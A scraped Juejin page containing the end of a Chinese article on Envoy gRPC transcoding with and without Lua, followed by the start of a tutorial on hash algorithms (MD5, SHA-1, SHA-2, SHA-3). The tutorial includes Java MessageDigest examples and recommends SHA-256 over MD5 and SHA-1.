<table><thead><tr><th>维度</th><th>使用 Lua</th><th>不使用 Lua</th></tr></thead><tbody><tr><td><strong>架构复杂度</strong></td><td>高（需要维护 Lua 脚本）</td><td>低（配置简单）</td></tr><tr><td><strong>性能</strong></td><td>较低（多一次转换）</td><td>较高（减少转换）</td></tr><tr><td><strong>维护成本</strong></td><td>高（需要维护 Lua 脚本和 RPC 服务）</td><td>低（只需维护 RPC 服务）</td></tr><tr><td><strong>类型安全</strong></td><td>低（Lua 脚本运行时检查）</td><td>高（proto 编译时检查）</td></tr><tr><td><strong>调试难度</strong></td><td>高（问题可能在 Lua 层或 RPC 层）</td><td>低（问题集中在 RPC 层）</td></tr><tr><td><strong>职责划分</strong></td><td>模糊（Envoy 处理业务格式）</td><td>清晰（Envoy 只做协议转换）</td></tr><tr><td><strong>测试</strong></td><td>复杂（需要测试 Lua 脚本）</td><td>简单（只需测试 RPC 服务）</td></tr></tbody></table>
<h4 data-id="heading-100">9.4.2 响应格式处理位置</h4>
<p><strong>使用 Lua 方案</strong>：</p>
<pre><code class="hljs">RPC 服务返回原始格式 → Envoy Lua 转换 → HTTP 响应
</code></pre>
<p><strong>不使用 Lua 方案</strong>：</p>
<pre><code class="hljs">RPC 服务直接返回目标格式 → Envoy 协议转换 → HTTP 响应
</code></pre>
<h4 data-id="heading-101">9.5 注意事项</h4>
<ol start="107">
<li>
<p><strong>向后兼容</strong>：</p>
<ol>
<li>如果已有客户端在使用，需要考虑向后兼容</li>
<li>可以在一段时间内同时支持新旧两种格式</li>
<li>通过版本号或路径区分（如 <code>/api/v1/</code> 和 <code>/api/v2/</code>）</li>
</ol>
</li>
<li>
<p><strong>错误处理</strong>：</p>
<ol>
<li>确保所有错误都通过响应消息返回，而不是 gRPC 错误</li>
<li>统一错误码和错误消息格式</li>
<li>提供详细的错误信息（便于调试）</li>
</ol>
</li>
<li>
<p><strong>测试</strong>：</p>
<ol>
<li>充分测试所有接口的响应格式</li>
<li>测试各种错误场景</li>
<li>验证性能是否有提升</li>
</ol>
</li>
<li>
<p><strong>监控</strong>：</p>
<ol>
<li>监控接口响应时间</li>
<li>监控错误率</li>
<li>对比迁移前后的性能指标</li>
</ol>
</li>
</ol>
<h3 data-id="heading-102">9.6 最佳实践总结</h3>
<ol start="111">
<li>
<p><strong>统一响应格式</strong>：</p>
<ol>
<li>所有有 HTTP 注解的 RPC 方法使用 <code>{code, msg, data}</code> 格式</li>
<li>内部 gRPC 调用方法可以保持原有格式</li>
</ol>
</li>
<li>
<p><strong>错误处理</strong>：</p>
<ol>
<li>所有错误通过响应消息返回，不使用 gRPC 错误</li>
</ol>
</li>
<li>
<p><strong>职责划分</strong>：</p>
<ol>
<li>Envoy：仅做协议转换（HTTP ↔ gRPC）</li>
<li>RPC 服务：处理业务逻辑和响应格式</li>
</ol>
</li>
<li>
<p><strong>类型安全</strong>：</p>
<ol>
<li>响应格式在 proto 文件中定义</li>
<li>编译时检查，避免运行时错误</li>
</ol>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[加密与签名技术之哈希算法]]></title>    <link>https://juejin.cn/post/7579567346390908954</link>    <guid>https://juejin.cn/post/7579567346390908954</guid>    <pubDate>2025-12-04T03:37:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579567346390908954" data-draft-id="7579512734297636902" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="加密与签名技术之哈希算法"/> <meta itemprop="keywords" content="后端,算法"/> <meta itemprop="datePublished" content="2025-12-04T03:37:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Stream"/> <meta itemprop="url" content="https://juejin.cn/user/4132429930956443"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            加密与签名技术之哈希算法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4132429930956443/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Stream
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T03:37:23.000Z" title="Thu Dec 04 2025 03:37:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>哈希算法将任意长度的数据映射为固定长度的哈希值。具有单向性、确定性、雪崩效应等特点。</p>
<h2 data-id="heading-1">目录</h2>
<ol start="0">
<li><a href="#md5" title="#md5">MD5</a></li>
<li><a href="#sha-1" title="#sha-1">SHA-1</a></li>
<li><a href="#sha-2%E7%B3%BB%E5%88%97" title="#sha-2%E7%B3%BB%E5%88%97">SHA-2系列</a></li>
<li><a href="#sha-3%E7%B3%BB%E5%88%97" title="#sha-3%E7%B3%BB%E5%88%97">SHA-3系列</a></li>
<li><a href="#blake2" title="#blake2">BLAKE2</a></li>
<li><a href="#sm3" title="#sm3">SM3 (国密算法)</a></li>
<li><a href="#%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94" title="#%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94">性能对比</a></li>
</ol>
<hr/>
<h2 data-id="heading-2">MD5</h2>
<h3 data-id="heading-3">原理</h3>
<p>MD5 (Message Digest Algorithm 5) 产生128位（16字节）哈希值。使用Merkle-Damgård结构。</p>
<h3 data-id="heading-4">技术规格</h3>

























<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>输出长度</td><td>128位 (16字节)</td></tr><tr><td>块大小</td><td>512位</td></tr><tr><td>安全级别</td><td><strong>已不安全</strong> ⚠️</td></tr><tr><td>状态</td><td><strong>不应使用</strong></td></tr></tbody></table>
<h3 data-id="heading-5">应用场景</h3>
<p>❌ <strong>不应在新项目中使用</strong>，仅用于：</p>
<ul>
<li>非安全场景的校验和</li>
<li>数据去重（非安全场景）</li>
<li>学习目的</li>
</ul>
<h3 data-id="heading-6">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：快</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：低</li>
</ul>
<h3 data-id="heading-7">Java实现示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5Example</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"MD5"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        
        <span class="hljs-comment">// 转换为十六进制字符串</span>
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : hashBytes) {
            sb.append(String.format(<span class="hljs-string">"%02x"</span>, b));
        }
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hash</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"MD5"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input);
        
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : hashBytes) {
            sb.append(String.format(<span class="hljs-string">"%02x"</span>, b));
        }
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"⚠️ 警告: MD5已不安全，仅用于演示"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">"测试数据"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(input);
        System.out.println(<span class="hljs-string">"输入: "</span> + input);
        System.out.println(<span class="hljs-string">"MD5: "</span> + hash);
        System.out.println(<span class="hljs-string">"长度: "</span> + hash.length() + <span class="hljs-string">" 字符 (128位)"</span>);
    }
}
</code></pre>
<h3 data-id="heading-8">安全建议</h3>
<p>⚠️ <strong>强烈建议：</strong></p>
<ul>
<li><strong>不要用于安全相关场景</strong></li>
<li><strong>不要用于密码哈希</strong></li>
<li><strong>不要用于数字签名</strong></li>
<li>迁移到SHA-256或更高</li>
</ul>
<hr/>
<h2 data-id="heading-9">SHA-1</h2>
<h3 data-id="heading-10">原理</h3>
<p>SHA-1 (Secure Hash Algorithm 1) 产生160位（20字节）哈希值。同样基于Merkle-Damgård结构。</p>
<h3 data-id="heading-11">技术规格</h3>

























<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>输出长度</td><td>160位 (20字节)</td></tr><tr><td>块大小</td><td>512位</td></tr><tr><td>安全级别</td><td><strong>已不安全</strong> ⚠️</td></tr><tr><td>状态</td><td><strong>不应使用</strong></td></tr></tbody></table>
<h3 data-id="heading-12">应用场景</h3>
<p>❌ <strong>不应在新项目中使用</strong></p>
<h3 data-id="heading-13">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：快</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：低</li>
</ul>
<h3 data-id="heading-14">Java实现示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA1Example</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-1"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : hashBytes) {
            sb.append(String.format(<span class="hljs-string">"%02x"</span>, b));
        }
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"⚠️ 警告: SHA-1已不安全，应迁移到SHA-256"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">"测试数据"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(input);
        System.out.println(<span class="hljs-string">"输入: "</span> + input);
        System.out.println(<span class="hljs-string">"SHA-1: "</span> + hash);
        System.out.println(<span class="hljs-string">"长度: "</span> + hash.length() + <span class="hljs-string">" 字符 (160位)"</span>);
    }
}
</code></pre>
<h3 data-id="heading-15">安全建议</h3>
<p>⚠️ <strong>强烈建议迁移到SHA-256</strong></p>
<hr/>
<h2 data-id="heading-16">SHA-2系列</h2>
<h3 data-id="heading-17">原理</h3>
<p>SHA-2系列包括SHA-224、SHA-256、SHA-384、SHA-512等变体。使用Merkle-Damgård结构。</p>
<h3 data-id="heading-18">技术规格</h3>













































<table><thead><tr><th>算法</th><th>输出长度</th><th>块大小</th><th>字长</th><th>轮数</th><th>安全级别</th></tr></thead><tbody><tr><td>SHA-224</td><td>224位</td><td>512位</td><td>32位</td><td>64</td><td>高</td></tr><tr><td>SHA-256</td><td>256位</td><td>512位</td><td>32位</td><td>64</td><td><strong>推荐</strong></td></tr><tr><td>SHA-384</td><td>384位</td><td>1024位</td><td>64位</td><td>80</td><td>高</td></tr><tr><td>SHA-512</td><td>512位</td><td>1024位</td><td>64位</td><td>80</td><td>高</td></tr></tbody></table>
<h3 data-id="heading-19">应用场景</h3>
<ol start="0">
<li><strong>密码存储</strong>：结合PBKDF2、bcrypt等</li>
<li><strong>数字签名</strong>：与RSA、ECDSA结合</li>
<li><strong>区块链</strong>：比特币、以太坊</li>
<li><strong>数据完整性</strong>：文件校验、传输验证</li>
<li><strong>TLS/SSL</strong>：证书指纹</li>
<li><strong>Git</strong>：对象哈希</li>
</ol>
<h3 data-id="heading-20">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：快（SHA-256最快）</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：低（某些CPU有硬件加速）</li>
<li><strong>吞吐量</strong>：GB/s级别</li>
</ul>
<h3 data-id="heading-21">Java实现示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
<span class="hljs-keyword">import</span> java.util.Base64;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA2Example</span> {
    
    <span class="hljs-comment">/**
     * SHA-256哈希（最常用）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha256</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-256"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * SHA-256哈希（返回Base64）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha256Base64</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-256"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * SHA-512哈希
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha512</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-512"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * SHA-384哈希
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha384</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-384"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * SHA-224哈希
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha224</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-224"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * 文件哈希（适合大文件）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hashFile</span><span class="hljs-params">(java.io.InputStream inputStream, String algorithm)</span> 
            <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(algorithm);
        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8192</span>];
        <span class="hljs-type">int</span> bytesRead;
        
        <span class="hljs-keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) {
            md.update(buffer, <span class="hljs-number">0</span>, bytesRead);
        }
        
        <span class="hljs-keyword">return</span> bytesToHex(md.digest());
    }
    
    <span class="hljs-comment">/**
     * 字节数组转十六进制字符串
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : bytes) {
            sb.append(String.format(<span class="hljs-string">"%02x"</span>, b));
        }
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-comment">/**
     * 验证数据完整性
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verifyIntegrity</span><span class="hljs-params">(String data, String expectedHash)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">actualHash</span> <span class="hljs-operator">=</span> sha256(data);
        <span class="hljs-keyword">return</span> actualHash.equals(expectedHash);
    }
    
    <span class="hljs-comment">/**
     * 完整示例
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">"这是要哈希的数据"</span>;
        
        System.out.println(<span class="hljs-string">"=== SHA-2系列哈希 ==="</span>);
        System.out.println(<span class="hljs-string">"输入: "</span> + input);
        System.out.println(<span class="hljs-string">"SHA-224: "</span> + sha224(input));
        System.out.println(<span class="hljs-string">"SHA-256: "</span> + sha256(input));
        System.out.println(<span class="hljs-string">"SHA-384: "</span> + sha384(input));
        System.out.println(<span class="hljs-string">"SHA-512: "</span> + sha512(input));
        
        System.out.println(<span class="hljs-string">"\n=== 数据完整性验证 ==="</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">"重要数据"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> sha256(data);
        System.out.println(<span class="hljs-string">"数据: "</span> + data);
        System.out.println(<span class="hljs-string">"哈希: "</span> + hash);
        System.out.println(<span class="hljs-string">"验证结果: "</span> + verifyIntegrity(data, hash));
        
        System.out.println(<span class="hljs-string">"\n=== 性能测试 ==="</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">testData</span> <span class="hljs-operator">=</span> <span class="hljs-string">"性能测试数据"</span> + <span class="hljs-string">"x"</span>.repeat(<span class="hljs-number">10000</span>);
        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            sha256(testData);
        }
        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        System.out.println(<span class="hljs-string">"SHA-256 (1000次): "</span> + (end - start) + <span class="hljs-string">"ms"</span>);
    }
}
</code></pre>
<h3 data-id="heading-22">安全建议</h3>
<p>✅ <strong>推荐：</strong></p>
<ul>
<li><strong>SHA-256</strong>：最常用，性能与安全性平衡</li>
<li><strong>SHA-384</strong>：高安全需求</li>
<li><strong>SHA-512</strong>：极高安全需求</li>
</ul>
<hr/>
<h2 data-id="heading-23">SHA-3系列</h2>
<h3 data-id="heading-24">原理</h3>
<p>SHA-3基于Keccak算法，使用海绵结构（Sponge Construction），不同于SHA-2的Merkle-Damgård结构。</p>
<h3 data-id="heading-25">技术规格</h3>



































<table><thead><tr><th>算法</th><th>输出长度</th><th>容量</th><th>安全级别</th></tr></thead><tbody><tr><td>SHA3-224</td><td>224位</td><td>448位</td><td>高</td></tr><tr><td>SHA3-256</td><td>256位</td><td>512位</td><td><strong>推荐</strong></td></tr><tr><td>SHA3-384</td><td>384位</td><td>768位</td><td>高</td></tr><tr><td>SHA3-512</td><td>512位</td><td>1024位</td><td>高</td></tr></tbody></table>
<h3 data-id="heading-26">应用场景</h3>
<ol start="0">
<li><strong>后量子密码学</strong>：作为SHA-2的替代</li>
<li><strong>新项目</strong>：考虑使用SHA-3</li>
<li><strong>区块链</strong>：某些新兴区块链</li>
<li><strong>需要不同架构的场景</strong></li>
</ol>
<h3 data-id="heading-27">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：中等（比SHA-2稍慢）</li>
<li><strong>内存占用</strong>：中等</li>
<li><strong>CPU使用率</strong>：中等</li>
<li><strong>硬件加速</strong>：较少支持</li>
</ul>
<h3 data-id="heading-28">Java实现示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA3Example</span> {
    
    <span class="hljs-comment">/**
     * SHA3-256哈希
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha3_256</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA3-256"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * SHA3-512哈希
     */</span>
